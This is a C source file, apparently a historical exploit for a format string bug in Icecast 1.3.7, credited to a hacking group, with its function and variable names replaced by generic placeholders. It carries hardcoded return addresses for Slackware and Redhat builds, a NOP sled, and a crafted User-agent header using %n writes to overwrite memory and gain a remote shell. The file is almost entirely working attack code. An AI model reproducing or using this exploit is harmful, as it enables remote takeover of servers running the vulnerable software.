
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int tl ;
struct target {char* member_0; char* member_1; char* member_2; char* member_3; char* member_4; int member_5; int member_6; int member_7; int member_8; int member_9; char* name; int xx; int one; int two; int three; int pad; char* addr1; char* addr2; char* addr3; char* addr4; } ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {int sin_family; int sin_port; TYPE_1__ sin_addr; } ;
struct sockaddr {int dummy; } ;
typedef int sk ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int) ;
 int FUNC_1 (char*) ;
 char* VAR_3 ;
 int FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int) ;
 int FUNC_5 (char*) ;
 int VAR_4 ;
 int FUNC_6 (char*,char*,int) ;
 int FUNC_7 (char*,char,int) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (int,char*,int,int ) ;
 int FUNC_10 (int,char*,int,int ) ;
 int FUNC_11 (int ,int ) ;
 int FUNC_12 (int ,int ,int ) ;
 int FUNC_13 (char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*,char*) ;
 int FUNC_14 (char*,char*) ;
 int FUNC_15 (char*) ;
 int VAR_5 ;

int FUNC_16(int VAR_6,char **VAR_7){
   int VAR_8,VAR_9,VAR_10;
   struct sockaddr_in VAR_11;
   char VAR_12[9000],VAR_13[9000],VAR_14[300],VAR_15[300],VAR_16[300],VAR_17[1000],VAR_18[100];
   struct target VAR_19[]={
        {
           "icecast-1.3.7.tar.gz compiled on Slackware 7.0",
           "\x1c\xdb\x5f\xbf",
           "\x1d\xdb\x5f\xbf",
           "\x1e\xdb\x5f\xbf",
           "\x1f\xdb\x5f\xbf",
           123,
           136,
           96,
           2076,
           5
        },
        {
           "icecast-1.3.7.tar.gz compiled on Redhat 7.0",
           "\xd8\xd8\x5f\xbf",
           "\xd9\xd8\x5f\xbf",
           "\xda\xd8\x5f\xbf",
           "\xdb\xd8\x5f\xbf",
           116,
           159,
           96,
           2074,
           3
        }
   };

   FUNC_8("Icecast 1.3.7 format bug exploit by |CyRaX| <cyrax@pkcrew.org\n");
   FUNC_8("Packet Knights Crew | http://www.pkcrew.org/\n");

   if(VAR_6<4){
      FUNC_8("Usage : ./PKCicecast-ex <target> <port> <type>\n");
      FUNC_8("types are :\n");
      for(VAR_9=0;VAR_9<(sizeof(VAR_19)/sizeof(struct target));VAR_9++){
         FUNC_8("%2i : %s\n",VAR_9,VAR_19[VAR_9].name);
      }
      FUNC_3(0);
   }

   VAR_10=FUNC_1(VAR_7[3]);
   FUNC_7(VAR_12,0,9000);
   FUNC_7(VAR_13,0,9000);
   FUNC_7(VAR_14,0,300);
   FUNC_7(VAR_15,0,300);
   FUNC_7(VAR_16,0,300);
   FUNC_7(VAR_18,0,100);
   FUNC_7(VAR_17,'\x90',1000);
   VAR_17[1000]=0;

   VAR_8=FUNC_12(VAR_0,VAR_2,0);

   VAR_4=FUNC_5(VAR_7[1]);
   VAR_11.sin_addr.s_addr=VAR_4;
   VAR_11.sin_port=FUNC_4(FUNC_1(VAR_7[2]));
   VAR_11.sin_family=VAR_0;
   FUNC_2(VAR_8,(struct sockaddr *)&VAR_11,sizeof(VAR_11));
   FUNC_14(VAR_12,"GET / HTTP/1.0\n");
   FUNC_10(VAR_8,VAR_12,FUNC_15(VAR_12),0);

   for(VAR_9=0;VAR_9<=(VAR_19[VAR_10].xx*3);VAR_9+=3){
      FUNC_6(VAR_13+VAR_9,"%8x",3);
   }
   FUNC_7(VAR_14,'\x90',VAR_19[VAR_10].one);
   FUNC_7(VAR_15,'\x90',VAR_19[VAR_10].two);
   FUNC_7(VAR_16,'\x90',VAR_19[VAR_10].three);
   FUNC_6(VAR_14+FUNC_15(VAR_14)-2,"\xeb\x02",2);
   FUNC_6(VAR_15+FUNC_15(VAR_15)-2,"\xeb\x02",2);
   FUNC_6(VAR_16+FUNC_15(VAR_16)-2,"\xeb\x02",2);
   FUNC_7(VAR_18,'X',VAR_19[VAR_10].pad);
   FUNC_13(VAR_12,"User-agent: %s"
   "%s"
   "%s"
   "%s"
   "%s"
   "%s"
   "%%n"
   "%s%%n"
   "%s%%n"
   "%s%%n"
   "%s"
   "%s\n\n"
   ,VAR_18,VAR_19[VAR_10].addr1,VAR_19[VAR_10].addr2,VAR_19[VAR_10].addr3,VAR_19[VAR_10].addr4,
           VAR_13,VAR_14,VAR_15,VAR_16,VAR_17,VAR_3);
   FUNC_10(VAR_8,VAR_12,FUNC_15(VAR_12),0);
   FUNC_8("We must sleep for 120 seconds. Waiting for icecast to do the statistic\n");
   FUNC_0(120);
   FUNC_11(VAR_1,VAR_5);
   while(1)FUNC_9(VAR_8,VAR_12,9000,0);
}
